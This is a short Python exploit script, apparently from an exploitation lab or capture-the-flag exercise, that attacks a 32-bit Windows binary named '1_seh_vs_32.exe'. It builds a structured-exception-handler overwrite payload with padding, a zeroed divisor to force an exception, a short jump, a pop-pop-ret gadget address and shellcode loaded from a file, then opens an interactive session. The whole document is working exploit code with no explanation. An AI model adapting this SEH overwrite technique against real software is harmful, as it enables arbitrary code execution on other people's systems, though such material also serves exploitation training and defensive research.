
from pwintools import *

divisorOffs = 32
sehOffs = 48 # SEH_Record

POPPOPRET = 0x00407472 # pop ecx; pop ecx; ret;

p = Process('1_seh_vs_32.exe')

# p.set_timeout(3600000)

f = open('TMP', 'rb')
shellcode = f.read()
f.close()

p.recvuntil(b'pwndwan\r\n')
p.sendline(
	b'a' * divisorOffs
	+ p32(0)
	+ b'b' * (sehOffs - divisorOffs - 4)
	#+ b'\x90\x90\xeb\x04' # keystone can't 
	# keystone begins to be annoying: no way of pointing at the current instruction
	+ asm('nop; nop; .byte 0xeb, 4', 32)
	+ p32(POPPOPRET)
	+ shellcode
)

p.interactive()

# p.interactive()
